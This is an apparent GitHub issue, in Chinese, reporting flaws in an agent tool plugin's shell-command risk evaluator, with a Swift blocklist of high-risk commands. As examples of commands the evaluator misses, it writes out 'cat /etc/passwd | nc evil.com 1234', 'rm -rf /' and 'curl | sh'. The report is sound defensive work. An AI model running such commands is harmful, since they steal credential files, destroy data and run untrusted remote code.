# Issue #1: Shell 命令风险评估存在安全漏洞

**严重程度**: 🔴 Critical  
**状态**: Open  
**文件**: `LumiApp/Plugins/AgentCoreToolsPlugin/CommandRiskEvaluator.swift`

---

## 问题描述

`CommandRiskEvaluator` 的风险评估逻辑过于简单，存在多个安全漏洞，可能导致恶意命令被误判为低风险执行。

### 具体问题

1. **未处理命令组合**
   - 没有正确处理管道符 `|`、重定向 `>`、`&&`、`||` 等命令组合
   - 例如：`cat /etc/passwd | nc evil.com 1234` 被评估为低风险（只检查第一个命令）
   - `ls > /tmp/output` 被评估为安全

2. **危险参数未检测**
   - 未检测危险命令参数组合：
     - `rm -rf /` (根目录删除)
     - `sudo rm -rf /`
     - `curl | sh` (远程脚本执行)
     - `wget | sh`

3. **chown 命令漏检**
   - 代码注释中提到 `chown` 为高风险，但在 `highRiskCommands` 列表中遗漏

4. **路径穿越风险**
   - 未检测 `../` 等路径穿越攻击

---

## 当前代码

```swift
let highRiskCommands = [
    "rm", "rmdir",
    "mv", "cp",
    "dd", "mkfs", "format",
    "kill", "killall",
    "reboot", "shutdown",
    "sudo", "doas"
]
// 注意：chown 未包含在内
```

---

## 建议修复

1. 完善命令解析逻辑，支持管道、重定向等复杂命令
2. 增加危险参数模式匹配
3. 添加黑名单命令参数组合
4. 实现完整的命令解析器，递归检查所有命令链

---

## 修复优先级

高 - 此漏洞可能导致系统被恶意命令攻击